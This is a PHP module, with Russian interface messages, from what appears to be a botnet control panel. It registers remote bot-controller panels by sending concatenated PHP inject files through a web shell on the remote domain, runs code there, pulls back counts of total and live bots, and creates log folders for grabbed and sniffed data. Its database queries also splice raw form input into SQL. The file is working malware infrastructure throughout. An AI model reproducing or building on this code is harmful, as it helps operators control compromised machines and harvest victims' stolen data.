<?php

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

if(isset($_POST['submit'])){	array_walk($_POST, 'real_escape_string');

	if(empty($_POST['name'])){		$bad_form['name'] = 'Клиент не может быть пустой.';
		$FORM_BAD = 1;
	}else{		if(strlen($_POST['name']) > 32){			$bad_form['name'] = 'Клиент не может быть больше 32 символов.';
			$FORM_BAD = 1;
		}
	}

	if(empty($_POST['link']) || empty($_POST['key'])){
		if(empty($_POST['link'])){			$bad_form['link'] = 'Домен админки не может быть пустым.';
			$FORM_BAD = 1;
		}elseif(empty($_POST['key'])){			$bad_form['key'] = 'Ключ админки не может быть пустым.';
			$FORM_BAD = 1;
			$_POST['key'] = 'BOTNETCHECKUPDATER1234567893';
		}
	}else{
		$result = $mysqli->query("SELECT link, keyid FROM bf_admins WHERE (link='".$_POST['link']."')");
		if($result->link == $_POST['link']){			$bad_form['link'] = 'Введенный "Домен админки" уже есть в системе.';
			$FORM_BAD = 1;
		}else{			$get_php = '$cur_file = \''.$_POST['shell'].'\';';
			$get_php .= file_get_contents('modules/admins/injects/start.php');
			$get_php .= "print('OK');";
            if(get_http($_POST['link'], $get_php, $_POST['key'], $_POST['shell']) != 'OK'){            	$bad_form['get_result'] = 'На данном домене админка не найдена или ключ не верен.';
				$FORM_BAD = 1;
            }else{				$get_php = '$cur_file = \''.$_POST['shell'].'\';';
				$get_php .= file_get_contents('modules/admins/injects/start.php');
				$get_php .= file_get_contents('modules/admins/injects/mysqli.php');
				$get_php .= file_get_contents('modules/admins/injects/get_info.php');
				$cbots = json_decode(get_http($_POST['link'], $get_php, $_POST['key'], $_POST['shell']), true);
            }
		}
	}

	if($FORM_BAD <> 1){
		if($mysqli->query("INSERT INTO bf_admins (link, keyid, shell, count_bots, live_bots, name, post_id, update_date) VALUES ('".$_POST['link']."', '".$_POST['key']."', '".$_POST['shell']."', '".$cbots['bots']."', '".$cbots['live']."', '".$_POST['name']."', '".$_SESSION['user']->id."', NOW())") == false){			$errors .= '<div class="t"><div class="t4" align="center">Добавления админки сейчас невозможно, попробуйте позже.</div></div>';
		}else{			$result = $mysqli->query("SELECT id, link, keyid FROM bf_admins WHERE (link='".$_POST['link']."')");
			if($result->link == $_POST['link'] && $result->keyid == $_POST['key']){				@mkdir('logs/' . $result->id . '/');

				@mkdir('logs/' . $result->id . '/crt/');

				@mkdir('logs/' . $result->id . '/export/');
				@mkdir('logs/' . $result->id . '/export/fgr/');
				@mkdir('logs/' . $result->id . '/export/gra/');
				@mkdir('logs/' . $result->id . '/export/sni/');
				@mkdir('logs/' . $result->id . '/export/tra/');

				@mkdir('logs/' . $result->id . '/import/');
				@mkdir('logs/' . $result->id . '/import/fgr/');
				@mkdir('logs/' . $result->id . '/import/gra/');
				@mkdir('logs/' . $result->id . '/import/sni/');
				@mkdir('logs/' . $result->id . '/import/tra/');
			}
			$smarty->assign("registration_end", true);
		}
	}else{
		if(count($bad_form) > 0){
			rsort($bad_form);
			for($i = 0; $i < count($bad_form); $i++){
				if ( $i & 1 ) $value_count = "1"; else $value_count = "2";
				$errors .= '<div class="t"><div class="t4" align="center">' . $bad_form[$i] . '</div></div>';
			}
		}
	}

	$smarty->assign("account_errors", $errors);
}

?>